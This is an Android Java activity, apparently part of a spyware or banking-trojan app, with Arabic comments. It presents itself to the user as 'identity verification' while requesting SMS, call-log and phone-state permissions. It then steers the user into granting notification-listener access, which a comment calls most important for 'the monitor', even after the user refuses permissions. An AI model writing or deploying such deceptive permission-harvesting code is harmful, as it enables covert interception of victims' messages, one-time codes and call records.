package com.ban.ab;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class VerifyActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_verify);

        Button btnStartVerify = findViewById(R.id.btnStartVerify);

        btnStartVerify.setOnClickListener(v -> {
            // طلب الأذونات الأربعة الأساسية
            String[] permissions = {
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS
            };

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
            } else {
                proceedToNotificationSettings();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            // حتى لو رفض المستخدم بعض الأذونات، سنحاول توجيهه للإشعارات لأنها الأهم لعمل "المراقب"
            proceedToNotificationSettings();
        }
    }

    private void proceedToNotificationSettings() {
        if (!isNotificationServiceEnabled()) {
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                // في حال فشل فتح الإعدادات لسبب ما في بعض الأجهزة
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            }
        } else {
            Toast.makeText(this, "نظام الفحص نشط.. جاري الاتصال بالسيرفر", Toast.LENGTH_SHORT).show();
            finish(); // إغلاق الواجهة والعودة لـ SecondActivity
        }
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }
}
